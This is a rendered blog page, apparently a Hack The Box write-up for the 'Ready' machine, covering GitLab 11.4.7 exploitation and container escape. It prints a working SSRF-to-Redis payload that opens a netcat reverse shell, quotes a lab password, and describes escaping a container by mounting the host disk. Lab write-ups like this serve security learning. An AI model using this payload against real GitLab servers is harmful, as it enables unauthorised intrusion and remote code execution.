@@ -1,0 +1,186 @@
+I"#<h1 id="introductionready">Introduction@Ready:~$</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Column</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Name</td>
+      <td>Ready</td>
+    </tr>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.220</td>
+    </tr>
+    <tr>
+      <td>Points</td>
+      <td>30</td>
+    </tr>
+    <tr>
+      <td>Os</td>
+      <td>Linux</td>
+    </tr>
+    <tr>
+      <td>Difficult</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>Creator</td>
+      <td><a href="https://app.hackthebox.eu/users/27897">bertolis</a></td>
+    </tr>
+    <tr>
+      <td>Out on</td>
+      <td>28th November 2020</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="summary">Summary:~$</h1>
+
+<ul>
+  <li>Discovering the new host and scanning for open ports.</li>
+  <li>Logging in <code class="language-plaintext highlighter-rouge">Port 5080</code>, which is a <code class="language-plaintext highlighter-rouge">gitlab</code> signup/signin page.</li>
+  <li>Checking the gitlab version, which is <code class="language-plaintext highlighter-rouge">11.4.7</code></li>
+  <li>Looking for vulnerabilities for that version, found <code class="language-plaintext highlighter-rouge">SSRF - redis - RCE</code> in gitlab 11.4.7.</li>
+  <li>Exploiting the <code class="language-plaintext highlighter-rouge">vulnerability</code> and getting the <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
+  <li>For <code class="language-plaintext highlighter-rouge">Privilege escalation</code>, found a password file and logged in as <code class="language-plaintext highlighter-rouge">root</code> in the container.</li>
+  <li><strong>Mounting</strong> the drives present in <code class="language-plaintext highlighter-rouge">/dev</code> of the container, to get the <code class="language-plaintext highlighter-rouge">Root Flag</code>.</li>
+</ul>
+
+<h1 id="starting">Starting:~$</h1>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>I have used <strong>nmapAutomator</strong> , which keeps the scanning fast and reduces effort.<em>(Not recommended in real life scenarios).</em></p>
+
+<p>Dowload link: <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/nmap-automator-2.png" alt="" /></p>
+
+<p>I accessed port <code class="language-plaintext highlighter-rouge">5080</code> which shows a gitlab login and signup page.</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/accessing-port-5080-3.png" alt="" /></p>
+
+<p>Along with that I also checked the <code class="language-plaintext highlighter-rouge">/robots.txt</code>.</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/accessing-robots-txt-4.png" alt="" /></p>
+
+<p>There are a lot of directories but let’s first <code class="language-plaintext highlighter-rouge">signup</code> and then <code class="language-plaintext highlighter-rouge">login</code>.</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/registering-5.png" alt="" /></p>
+
+<p>The following page is displayed after logging in</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/signed-in-6.png" alt="" /></p>
+
+<p>In such cases, first thing I do is to check the <code class="language-plaintext highlighter-rouge">version</code> of <strong>Gitlab</strong>. After checking the <code class="language-plaintext highlighter-rouge">help</code> option in menu, I got this</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/help-section-version-7.png" alt="" /></p>
+
+<p>I googled a bit and got to know that <code class="language-plaintext highlighter-rouge">Gitlab</code> version <code class="language-plaintext highlighter-rouge">11.4.7</code> is vulnerable to <code class="language-plaintext highlighter-rouge">RCE via SSRF</code>.</p>
+
+<p>I found a <a href="https://github.com/jas502n/gitlab-SSRF-redis-RCE"><code class="language-plaintext highlighter-rouge">Git Repository</code></a> and <a href="https://www.youtube.com/watch?v=LrLJuyAdoAg"><code class="language-plaintext highlighter-rouge">Live Overflow</code></a> also explained it in one of his videos.</p>
+
+<p>Now creating a new <code class="language-plaintext highlighter-rouge">Project</code> in Gitlab by importing it via <code class="language-plaintext highlighter-rouge">git Repo byURL</code>.</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/import-project-by-git-URL-12.png" alt="" /></p>
+
+<p>Now before pressing the <code class="language-plaintext highlighter-rouge">save</code> button, setting up proxy and turn on the interceptor on <code class="language-plaintext highlighter-rouge">Burp</code>.</p>
+
+<p>After <code class="language-plaintext highlighter-rouge">Intercepting</code> the request, let’s replace <code class="language-plaintext highlighter-rouge">import_url</code> parameter by the following payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>
+git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
+ multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|nc -e /bin/bash IP PORT\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
+ exec
+ exec
+ exec
+/ssrf.git
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Make sure to check the <a href="https://github.com/jas502n/gitlab-SSRF-redis-RCE">POC</a> for <code class="language-plaintext highlighter-rouge">RCE via SSRF</code>, I got the above payload after making some changes. (<em>Make sure you check the gaps specified in the POC, or else the playload won’t work <strong>It didn’t work in my case</strong> .</em>)</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/final-req-16.png" alt="" /></p>
+
+<p>After listening on port 1234, I got a <code class="language-plaintext highlighter-rouge">Reverse shell</code> as <code class="language-plaintext highlighter-rouge">git</code>, converted it to an <a href="https://netsec.ws/?p=337">interactive shell</a></p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/tty-shell-19.png" alt="" /></p>
+
+<p>Got <code class="language-plaintext highlighter-rouge">User Flag</code>.</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/got-user-txt-20.png" alt="" /></p>
+
+<p>For <code class="language-plaintext highlighter-rouge">Privilege Escalation</code> I started with manual enumeration and got a <code class="language-plaintext highlighter-rouge">backup folder</code> in <code class="language-plaintext highlighter-rouge">/opt</code> directory.
+It contained 3 files i.e.</p>
+<ol>
+  <li>gitlab-secrets.json</li>
+  <li>gitlab.rb</li>
+  <li>docker-compose.yml</li>
+</ol>
+
+<p>After having a look at each of these files, I found that <code class="language-plaintext highlighter-rouge">gitlab.rb</code> contained some <code class="language-plaintext highlighter-rouge">passwords</code>.</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/few-passwords-23.png" alt="" /></p>
+
+<p>Simultaneously trying each password, <code class="language-plaintext highlighter-rouge">wW59U!ZKMbG9+*#h</code> one worked for <strong>sudo su</strong>.</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/became-root-but-not-root-text-24.png" alt="" /></p>
+
+<p>After becoming root, I tried finding out the <code class="language-plaintext highlighter-rouge">root.txt</code> but there wasn’t any because we are in a <strong>container</strong> as <em>root</em>.</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/no-root-text.png" alt="" /></p>
+
+<p>After reading this blog on <a href="https://kinvolk.io/blog/2018/04/towards-unprivileged-container-builds/">Unprivileged container builds</a>, I tried the <code class="language-plaintext highlighter-rouge">new mount</code> technique, but before proceeding further I cheked which drives are present in <code class="language-plaintext highlighter-rouge">/dev</code> directory with the name of <code class="language-plaintext highlighter-rouge">sda</code>.</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/dev-sda-command-25.png" alt="" /></p>
+
+<p>There are 4 sda disks present, with the following names:</p>
+<ol>
+  <li>sda</li>
+  <li>sda1</li>
+  <li>sda2</li>
+  <li>sda3</li>
+</ol>
+
+<p>I tried mounting all of them but only <code class="language-plaintext highlighter-rouge">sda2</code> worked.</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/only-sda-test3-worked-27.png" alt="" /></p>
+
+<p>Entering the <code class="language-plaintext highlighter-rouge">test-sda2</code> folder and accessing the <code class="language-plaintext highlighter-rouge">root</code> directory, I got the <code class="language-plaintext highlighter-rouge">Root Flag</code>.</p>
+
+<hr />
+<p><img src="/assets/img/ready-hackthebox/got-root-flag-28.png" alt="" /></p>
+
+<hr />
+:ET
